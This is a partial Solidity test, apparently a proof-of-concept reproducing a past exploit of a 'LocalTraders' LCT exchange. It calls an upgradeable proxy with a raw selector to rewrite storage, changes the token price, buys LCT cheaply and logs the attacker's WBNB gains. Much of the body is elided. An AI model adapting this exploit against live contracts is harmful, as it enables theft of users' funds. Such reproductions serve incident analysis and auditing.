...
contract LocalTraders is Test {
    ILCTExchange LCTExchange =
        ILCTExchange(0xcE3e12bD77DD54E20a18cB1B94667F3E697bea06);
    ...
    address public upgradeableProxy =
        0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41;
    ...
    function testAccess() public {
        ...
        emit log_named_address(
            "[1] Address value in slot 0 after first call",
            addrInSlot0After
        );

        // 2.Changing token price in vulnerable contract

        cheats.roll(28460898);
        uint256 uintInSlot3Before = getValFromSlot3();
        emit log_named_uint(
            "[2] Uint value (token price) in slot 3 before second call",
            uintInSlot3Before
        );
        ...
        upgradeableProxy.call(
            abi.encodeWithSelector(0x925d400c, paramForCall2)
        );
        ...
        emit log_named_uint(
            "[2] Uint value (token price) in slot 3 after second call",
            uintInSlot3After
        );

        // 3.Buying LCT

        cheats.roll(28460899);
        uint256 payableAmount = (LCT.balanceOf(address(LCTExchange)) /
            1 ether) - 1;
        ...
        emit log_named_decimal_uint(
            "[4] Attacker amount of WBNB after attack",
            WBNB.balanceOf(address(this)),
            WBNB.decimals()
        );
    }
